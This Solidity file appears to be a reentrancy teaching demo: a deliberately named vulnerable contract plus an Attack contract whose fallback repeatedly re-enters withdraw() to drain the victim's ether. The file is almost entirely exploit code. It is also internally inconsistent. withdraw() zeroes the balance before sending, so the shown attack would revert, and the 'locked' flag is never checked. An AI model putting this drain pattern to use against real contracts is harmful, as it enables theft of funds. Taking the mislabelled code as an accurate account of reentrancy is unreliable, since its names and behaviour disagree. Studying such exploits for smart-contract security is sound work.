// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract ReentrantVulnerable {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    bool locked;

    function withdraw() public payable {
        uint256 bal = balances[msg.sender];
        locked = true;
        require(bal > 0);

        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        locked = false;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Attack {
    ReentrantVulnerable public reentrantVulnerable;

    constructor(address _reentrantVulnerableAddress) {
        reentrantVulnerable = ReentrantVulnerable(_reentrantVulnerableAddress);
    }

    function attack() external payable {
        reentrantVulnerable.deposit{value: 1 ether}();
        reentrantVulnerable.withdraw();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    fallback() external payable {
        if (address(reentrantVulnerable).balance >= 1) {
            reentrantVulnerable.withdraw();
        }
    }
}
